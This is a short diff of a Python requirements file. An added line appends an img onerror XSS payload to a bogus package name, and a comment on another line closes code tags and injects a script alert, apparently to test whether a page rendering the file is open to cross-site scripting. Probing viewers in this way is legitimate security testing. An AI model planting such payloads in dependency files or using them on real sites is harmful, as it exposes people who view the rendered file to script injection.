@@ -1,4 +1,5 @@
 ﻿absl-py==2.3.1
+invalid-package==1.0.0<img src=x onerror=alert(document.domain)>
 accelerate==1.12.0 # --> </code></pre><script>alert(window.origin)</script>
 aiohttp==3.9.5
 aiosignal==1.4.0
